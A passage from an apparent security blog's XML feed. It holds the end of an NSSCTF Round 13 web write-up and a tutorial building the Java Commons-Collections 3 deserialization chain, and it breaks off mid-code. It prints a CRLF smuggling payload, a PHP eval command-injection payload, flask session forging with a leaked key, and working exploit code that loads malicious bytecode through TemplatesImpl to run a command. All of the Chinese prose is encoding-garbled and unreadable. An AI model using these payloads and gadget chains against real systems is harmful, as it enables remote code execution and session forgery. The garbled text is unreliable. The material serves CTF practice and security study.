alt="image-20230604215016705"><br>è¿™é‡Œå¯¹<code>/nssctf/</code>åšäº†ä¸ªä»£ç†è½¬å‘ï¼ŒçŒœæµ‹åœ¨è½¬å‘åçš„æœºå™¨ä¸Šï¼Œåˆ©ç”¨crlfæ¼æ´å»è¯»å–flagï¼Œè¿™ä¸ªpayloadç›¸å½“äºå»è¯·æ±‚è½¬å‘åçš„æœºå™¨ä¸Šçš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/0%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150023.png" alt="image-20230604215035976"></p><h2 id="MyWeb"><a href="#MyWeb" class="headerlink" title="MyWeb"></a>MyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="comment">// å†™äº†ä¸ªç½‘é¡µå­˜å‚¨JSONæ•°æ®ï¼Œä½†æ˜¯è¿˜ä¸ä¼šå¤„ç†jsonæ ¼å¼ï¼Œè¿™æ ·å¤„ç†åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜å§</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;, &#x27;<span class="subst">$value</span>&#x27;]&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;read&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$data = &#x27;</span> . <span class="variable">$data</span> . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤ç°ç¯å¢ƒå‡ºäº†é—®é¢˜ï¼Œå…¶å®è¿™ä¸ªé¢˜å°±æ˜¯æŠŠåŸæ¥çš„æ•°æ®ç»™é—­åˆæ‰å°±èƒ½å‘½ä»¤æ‰§è¡Œäº†ï¼ŒçŒœæµ‹å®ƒå‚¨å­˜çš„jsonæ•°æ®æ ¼å¼ä¸º<code>[1,2,3,â€¦â€¦]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?mode=save&amp;value=];%0aecho cat /flag;%0a[</span><br><span class="line">?mode=read</span><br></pre></td></tr></table></figure><p>æ–¹å¼ä¸æ­¢è¿™ä¸€ä¸ªå› ä¸ºç¯å¢ƒé—®é¢˜ä¹Ÿæ²¡å»ä¸€ä¸ªä¸ªéªŒè¯äº†</p><h2 id="flask-jwt-hard"><a href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h2><p>ç™»å½•åæºç ä¸­ç»™äº†ä¸€ä¸ª&#x2F;worè·¯ç”±ï¼Œè®¿é—®å‘ç°æ²¡å•¥ä¸œè¥¿ï¼Œç„¶åæŠŠsessionéšä¾¿åˆ é™¤ç‚¹ä¸œè¥¿é¡µé¢æŠ¥é”™ï¼Œå¼€å¯äº†debugåœ¨æºç ä¸­æ‰¾åˆ°key <code>hardgam3_C0u1d_u_f1ndM3????&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150428.png" alt="image-20230604215051392"><br>æ¥ä¸‹æ¥å°±å’Œå‰é¢ä¸€æ ·ä¼ªé€ sessionå°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s hardgam3_C0u1d_u_f1ndM3???? -c &quot;session&quot;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s hardgam3_C0u1d_u_f1ndM3???? -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;0e382100446e160095f79a16dd0bceddee884c4d84dcc9e53bfb47d206175ad1c5005f21630c2892c78a7e4985b69503704833e18205e6eacc9dbb58aa7b3e85&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br><span class="line">//ä¼ªé€ çš„æ—¶å€™æŠŠtimeåˆ é™¤ï¼Œä¸ç„¶ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure><h2 id="TimeTrcer"><a href="#TimeTrcer" class="headerlink" title="TimeTrcer"></a>TimeTrcer</h2><p>0è§£é¢˜ï¼Œçœ‹äº†wpæœ‰ç‚¹éš¾ï¼Œä¸æƒ³å¤ç°äº†<br>wpï¼š<a href="https://gtg.ink/2023/06/NSSCTFround13WP-TimeTrcer/">https://gtg.ink/2023/06/NSSCTFround13WP-TimeTrcer/</a></p><p>å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/F12-blog/p/17455819.html">NSSCTF Round#13 webä¸“é¡¹ - F12~ - åšå®¢å›­ (cnblogs.com)</a><br><a href="https://ph0ebus.cn/post/NSSRound13%20WEB.html#ez_factors">NSSCTFRound#13 Web Â· ph0ebusâ€™s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾3</title>
      <link href="/2023/06/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE3/"/>
      <url>/2023/06/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE3/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æœ€è¿‘å‡ å‘¨æ²¡ç¢°Javaæ„Ÿè§‰åˆæœ‰ç‚¹ç”Ÿç–äº†ï¼Œåœ¨CC3ä¸­å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å’Œ1ï¼Œ6ä¸ä¸€æ ·ï¼Œè¿™é‡Œç”¨çš„æ˜¯åŠ¨æ€ç±»åŠ è½½ï¼Œä½¿ç”¨<code>defineClass-&gt;newInstance</code> æ¥å‘½ä»¤æ‰§è¡Œå³åœ¨å­—èŠ‚é‡Œé¢åŠ è½½ä¸€ä¸ªç±»ç„¶åå®ä¾‹åŒ–æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥ç›´æ¥ä»è¿™é‡Œå…¥æ‰‹é€†æ¨ï¼Œè¿˜æ˜¯find usageså¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†defineClassï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªprotectedæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè°ƒç”¨å®ƒpublicæ–¹æ³•ï¼Œæœ€ç»ˆåœ¨TemplatesImplç±»çš„<code>static final class TransletClassLoader</code>ä¸‹æ‰¾åˆ°defineClassè¿™é‡Œæ²¡æœ‰æ ‡æ³¨ä½œç”¨åŸŸå³é»˜è®¤ä¸ºdefalutï¼Œä¹Ÿå°±æ˜¯è‡ªå·±çš„ç±»é‡Œé¢å¯ä»¥è°ƒç”¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031733679.png" alt="image-20230603173329428"><br>ç»§ç»­find usageså‘ç°defineTransletClassesç§æœ‰æ–¹æ³•é‡Œé¢è°ƒç”¨äº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031733726.png" alt="image-20230603173354505"><br>è¿™é‡Œ<code>_bytecodes</code>ä¸èƒ½ä¸ºç©ºä¸ç„¶å°±ä¸èƒ½æ‰§è¡Œåˆ°defineClassæ–¹æ³•äº†ï¼Œç„¶åç»§ç»­find usagesæœ€ç»ˆæ‰¾åˆ°äº†getTransletInstanceæ–¹æ³•å¹¶ä¸”è¿™é‡Œæœ‰ä¸ª<code>newInstance()</code>å®ä¾‹åŒ–çš„è¿‡ç¨‹ï¼ŒåŠ¨æ€æ‰§è¡Œä»£ç æ­£å¥½éœ€è¦å®ä¾‹åŒ–ï¼Œæ‰€ä»¥å¦‚æœèµ°å®Œè¿™ä¸ªå‡½æ•°å°±ç›¸å½“äºç»“æŸäº†ï¼Œä½†æ˜¯è¿™ä¸ªgetTransletInstanceæ–¹æ³•æ˜¯ç§æœ‰ï¼Œæ‰€ä»¥è¿˜å¾—ç»§ç»­æ‰¾ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†newTransformeræ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†getTransletInstanceæ–¹æ³•ï¼Œå¹¶ä¸”newTransformeræ–¹æ³•æ˜¯publicï¼Œæ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨äº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734855.png" alt="image-20230603173407614"></p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤è¡Œä»£ç å…¶å®å°±æ˜¯å‘½ä»¤æ‰§è¡Œçš„ä»£ç ï¼Œä½†æ˜¯è‚¯å®šæœ‰å¾ˆå¤šé™åˆ¶æ¡ä»¶è®©å®ƒæ— æ³•æ‰§è¡Œï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯æ»¡è¶³æ‰€æœ‰æ¡ä»¶è®©å®ƒæ‰§è¡Œï¼Œé¦–å…ˆæ˜¯ä¸‹é¢çš„è¿™äº›æ¡ä»¶<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734199.png" alt="image-20230603173436099"><br><code>_name</code>ä¸èƒ½ä¸ºç©ºï¼Œ<code>_class</code>å¿…é¡»ä¸ºç©ºè¿™æ ·æ‰èƒ½è¿›å…¥<code>defineTransletClasses()</code>æ–¹æ³•ï¼Œç„¶åè·Ÿè¿›è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734897.png" alt="image-20230603173450789"><br><code>_bytecodes</code>ä¸èƒ½ä¸ºç©ºï¼Œå¦åˆ™æŠ›å¼‚å¸¸ï¼Œ<code>_tfactory</code>éœ€è¦è°ƒæ–¹æ³•æ‰€ä»¥ä¹Ÿéœ€è¦èµ‹å€¼ï¼Œç„¶åå¼€å§‹æ„é€ EXP</p><h2 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h2><p>é€šè¿‡åå°„è·å–å±æ€§ï¼Œ<code>_name</code>çš„å€¼æ˜¯Stringå…ˆéšä¾¿èµ‹ä¸€ä¸ªï¼Œ<code>_class</code>åˆå§‹å€¼å°±ä¸ºç©ºä¸ç”¨ç®¡ï¼Œç„¶åæ˜¯<code>_bytecodes</code>æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œä½†æ˜¯ä¼ å…¥defineClassæ–¹æ³•çš„å€¼æ˜¯ä¸€ç»´æ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªä¸€ç»´æ•°ç»„å­˜æ”¾çš„æ˜¯æ¶æ„å­—èŠ‚ç ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œçš„classæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŠŠè¿™ä¸ªå†™å®Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¹Ÿå¯ä»¥æ”¾æ„é€ å‡½æ•°é‡Œé¢ï¼Œå®ä¾‹åŒ–çš„æ—¶å€™èƒ½åŠ è½½å°±è¡Œï¼Œè¿™éƒ¨åˆ†å¯¹äºçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\java-tools\\CCé“¾\\CC3\\&quot;</span>));  </span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å®Œæˆäº†äºŒç»´æ•°ç»„èµ‹å€¼ï¼Œä¼ ç»™defineClassæ–¹æ³•çš„ä¹Ÿæ˜¯å­˜æ”¾æ¶æ„å­—èŠ‚ç çš„ä¸€ç»´æ•°ç»„<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735515.png" alt="image-20230603173507470"><br>å¾ªç¯å–å€¼ï¼Œç›¸å½“äºç¬¬ä¸€ä¸ªå€¼å°±æ˜¯å­˜æ”¾æ¶æ„å­—èŠ‚ç çš„ä¸€ç»´æ•°ç»„ï¼Œè¿™ä¸ª<code>_bytecodes</code>èµ‹å€¼å°±è§£å†³äº†<br>ç„¶åæ˜¯<code>_tfactory</code>èµ‹å€¼ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªtransientè¡¨ç¤ºå®ƒæ˜¯ä¸ªä¸å¯åºåˆ—åŒ–çš„å˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ å€¼å°±æ²¡æœ‰æ„ä¹‰äº†ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šä¸¢å¤±ï¼Œæœ€ååœ¨readObjectä¸­æ‰¾åˆ°å®ƒçš„åˆå§‹å®šä¹‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ä¸ºç©ºï¼Œæ‰€ä»¥ç›´æ¥åå°„èµ‹å€¼ä¸ºTransformerFactoryImplå³å¯ï¼Œåˆ°è¿™é‡Œè¯¥æ»¡è¶³çš„æ¡ä»¶éƒ½æ»¡è¶³äº†ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åˆ°è¿™é‡ŒæŠ¥äº†ç©ºæŒ‡é’ˆé”™è¯¯<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735495.png" alt="image-20230603173521394"><br>æœ¬æ¥æƒ³è°ƒè¯•ä¸€ä¸‹ï¼Œä½†æ˜¯å‘ç°ç¯å¢ƒå¥½åƒæœ‰ç‚¹é—®é¢˜ä¸èƒ½åœ¨è¿™ä¸ªç±»ä¸‹è°ƒè¯•ï¼Œç›´æ¥å»422çœ‹æŠ¥é”™ä¹Ÿè¡Œï¼Œ<br>åœ¨418è¡Œä¼šåˆ¤æ–­æ¶æ„ç±»æ˜¯å¦ç»§æ‰¿äº†ABSTRACT_TRANSLETè¿™ä¸ªç±»å¦åˆ™æŠ¥é”™ï¼Œå³<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET))</span><br></pre></td></tr></table></figure><p>æˆ–è€…æˆ‘ä»¬ç»™<code>_auxClasses</code>èµ‹å€¼è®©å®ƒä¸ä¸ºç©ºï¼Œä½†æ˜¯è¿™æ ·<code>_transletIndex</code>ä¸º-1ä¼šåœ¨ä¸‹é¢çš„åˆ¤æ–­ç›´æ¥è·³å‡ºç¨‹åºï¼Œè¿™ä¸ªæ–¹æ³•å°±ä¸å¯å–ï¼Œæ‰€ä»¥ç›´æ¥è®©æ¶æ„ç±»ç»§æ‰¿AbstractTransletç±»ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»£ç å¼¹å‡ºæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735250.png" alt="image-20230603173533124"></p><h2 id="CC1-çš„TemplatesImplçš„å®ç°æ–¹å¼"><a href="#CC1-çš„TemplatesImplçš„å®ç°æ–¹å¼" class="headerlink" title="CC1 çš„TemplatesImplçš„å®ç°æ–¹å¼"></a>CC1 çš„TemplatesImplçš„å®ç°æ–¹å¼</h2><p>ç”±äºä¸Šé¢çš„éƒ¨åˆ†æˆ‘ä»¬åªæ˜¯æ›´æ”¹çš„æœ€åå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ï¼Œå‰é¢çš„é“¾å­ä»ç„¶æ²¡æœ‰å˜ï¼Œæ‰€ä»¥è¿™é‡Œå’ŒCC1çš„å‰åŠæ®µç»“åˆä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//æœ€åè¿™é‡Œèµ‹å€¼æ˜¯å› ä¸ºnew ConstantTransformer(templates)è¿™é‡Œå®šä¹‰çš„ç±»éœ€è¦ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735670.png" alt="image-20230603173548540"><br>ç„¶åæŠŠCC1åé¢çš„å…¨éƒ¨æ‹¿è¿‡æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 